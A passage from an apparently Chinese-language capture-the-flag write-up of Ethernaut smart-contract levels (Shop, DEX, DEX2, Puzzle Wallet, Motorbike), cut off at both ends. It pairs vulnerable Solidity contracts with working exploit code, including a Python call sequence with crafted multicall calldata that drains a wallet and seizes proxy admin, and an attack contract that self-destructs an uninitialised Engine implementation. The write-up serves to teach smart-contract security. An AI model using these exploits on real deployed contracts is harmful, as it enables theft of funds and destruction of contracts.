isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目需要两次调用<code>view</code>函数但是返回值不同。可以通过检测两次调用时的汽油数、检测某外部合约的变量变量值(如题目合约的<code>isSold</code>)来修改两次的结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Shop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    </span><br><span class="line">    uint256 _price = 100;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if(gasleft() &gt; 41000) &#123;</span><br><span class="line">            return 100;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        Shop shop = Shop(0xC1f535093bd82E7B2a56b0198d5aF4f8cACaA5FB);</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level22-dex">level22 DEX</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">    address public token1;</span><br><span class="line">    address public token2;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">        token2 = _token2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addLiquidity(address token_address, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(address from, address to, uint256 amount) public &#123;</span><br><span class="line">        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public &#123;</span><br><span class="line">        SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">        SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">        return IERC20(token).balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">    address private _dex;</span><br><span class="line"></span><br><span class="line">    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)</span><br><span class="line">        ERC20(name, symbol)</span><br><span class="line">    &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">        require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">        super._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依据规则，我们可以实现如下交换代币：</p>
<table>
<thead>
<tr>
<th style="text-align:center">token1</th>
<th style="text-align:center">token2</th>
<th style="text-align:center">sender -&gt; contract</th>
<th style="text-align:center">contract -&gt; sender</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">100</td>
<td style="text-align:center">100</td>
<td style="text-align:center">10 token1</td>
<td style="text-align:center">10 token2</td>
</tr>
<tr>
<td style="text-align:center">110</td>
<td style="text-align:center">90</td>
<td style="text-align:center">20 token2</td>
<td style="text-align:center">24 token1</td>
</tr>
<tr>
<td style="text-align:center">86</td>
<td style="text-align:center">110</td>
<td style="text-align:center">24 token1</td>
<td style="text-align:center">30 token2</td>
</tr>
</tbody>
</table>
<p>持续下去，我们可以使得其中一种<code>token</code>的数量归零。</p>
<h2 id="level23-dex2">level23 DEX2</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上述合约删除swap函数中的</span><br><span class="line">require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure>
<p>题目信任了所有的<code>ERC20</code>代币合约。我们可以根据给出的<code>SwappableToken</code>函数构建另外两个自定义的冥币<code>token</code>，然后使用我们的冥币去兑换题目合约中的<code>token</code>。</p>
<h2 id="level24-puzzle-wallet">level24 Puzzle Wallet</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData)</span><br><span class="line">        UpgradeableProxy(_implementation, _initData)</span><br><span class="line">    &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin() &#123;</span><br><span class="line">        require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted() &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">        require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">        require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success,) = to.call&#123;value: value&#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success,) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目使用<code>PuzzleProxy</code>合约对<code>PuzzleWallet</code>合约进行代理。通过<code>fallback</code>函数和<code>delegatecall</code>实现代理合约对逻辑合约中函数的调用。但是使用<code>delegatecall</code>时两个合约的插槽存在冲突，<code>PuzzleProxy.pendingAdmin == PuzzleWallet.owner</code>，<code>PuzzleProxy.admin == PuzzleWallet.maxBalance</code>。题目给出了<code>PuzzleProxy</code>合约的地址，同时对外暴露<code>PuzzleWallet</code>合约的接口。</p>
<p>首先调用<code>approveNewAdmin()</code>函数修改<code>PuzzleProxy.pendingAdmin</code>为自身，这会使得<code>PuzzleWallet.owner</code>也会变成自身，绕过<code>msg.sender == owner</code>检查。调用<code>addToWhitelist()</code>函数将自身加入白名单，绕过<code>onlyWhitelisted</code>检查。由于<code>multicall()</code>函数只限制了<code>deposit()</code>函数的调用次数，并没有限制在<code>multicall()</code>中调用<code>multicall()</code>，如此一来就可以利用这个函数多次调用<code>deposit()</code>函数。多次调用直到<code>balances[]</code>中记录的值超过合约中的存款。调用<code>execute()</code>函数清空存款。调用<code>setMaxBalance()</code>函数修改<code>PuzzleWallet.maxBalance</code>为自身地址的大小，这会使得<code>PuzzleProxy.admin</code>同步修改为自身。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Proxy.GetContract()</span><br><span class="line">Proxy.PayableCall(<span class="string">&#x27;proposeNewAdmin&#x27;</span>, [<span class="string">&#x27;0x8F4Bd3d8d348dB262c487366065F21dB95BFcB23&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(Proxy.ViewCall(<span class="string">&#x27;pendingAdmin&#x27;</span>, []))</span><br><span class="line"></span><br><span class="line">Wallet.GetContract()</span><br><span class="line">Wallet.PayableCall(<span class="string">&#x27;addToWhitelist&#x27;</span>, [<span class="string">&#x27;0x8F4Bd3d8d348dB262c487366065F21dB95BFcB23&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(Wallet.ViewCall(<span class="string">&#x27;whitelisted&#x27;</span>, [<span class="string">&#x27;0x8F4Bd3d8d348dB262c487366065F21dB95BFcB23&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Wallet.GetBalance())</span><br><span class="line">Wallet.PayableCall(<span class="string">&#x27;multicall&#x27;</span>, [[<span class="string">&quot;0xd0e30db0&quot;</span>, <span class="string">&quot;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&quot;</span>]], <span class="number">0.001</span>)</span><br><span class="line"><span class="built_in">print</span>(Wallet.GetBalance())</span><br><span class="line"></span><br><span class="line">Wallet.PayableCall(<span class="string">&#x27;execute&#x27;</span>, [<span class="string">&#x27;0x8F4Bd3d8d348dB262c487366065F21dB95BFcB23&#x27;</span>, <span class="built_in">int</span>(<span class="number">0.002</span> * <span class="number">10</span> ** <span class="number">18</span>), <span class="string">&#x27;0x&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(Wallet.GetBalance())</span><br><span class="line"></span><br><span class="line">Wallet.PayableCall(<span class="string">&#x27;setMaxBalance&#x27;</span>, [<span class="number">0x8F4Bd3d8d348dB262c487366065F21dB95BFcB23</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Proxy.ViewCall(<span class="string">&#x27;admin&#x27;</span>, []))</span><br></pre></td></tr></table></figure>
<p>调用时对的数据可以通过如下合约生成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;Problem.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    bytes[] public result;</span><br><span class="line"></span><br><span class="line">    function generate_data() public &#123;</span><br><span class="line">        bytes[] memory data_deposit = new bytes[](1);</span><br><span class="line">        bytes[] memory data_multicall = new bytes[](2);</span><br><span class="line">        data_deposit[0] = abi.encodeWithSelector(wallet.deposit.selector);</span><br><span class="line">        data_multicall[0] = data_deposit[0];</span><br><span class="line">        data_multicall[1] = abi.encodeWithSelector(wallet.multicall.selector, data_deposit);</span><br><span class="line">        result = data_multicall;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level25-motorbike">level25 Motorbike</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(abi.encodeWithSignature(&quot;initialize()&quot;));</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`.</span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback() external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(address newImplementation, bytes memory data) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line"></span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所有操作室通过<code>delegatecall</code>在代理合约实现的，并没有修改实际的逻辑合约。我们可以直接跟逻辑合约交互，让他再代理一层我们自己的合约，执行<code>selfdestruct</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;Problem.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Engine en = Engine(0xc51071aBcb9c624fBF2EebeD35C937eEffE8b966);</span><br><span class="line">    bytes public result;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        en.initialize();</span><br><span class="line">        bytes memory data = abi.encodeWithSelector(this.destruct.selector);</span><br><span class="line">        result = data;</span><br><span class="line">        en.upgradeToAndCall(address(this), data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destruct() public &#123;</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() payable external  &#123;</span><br><span 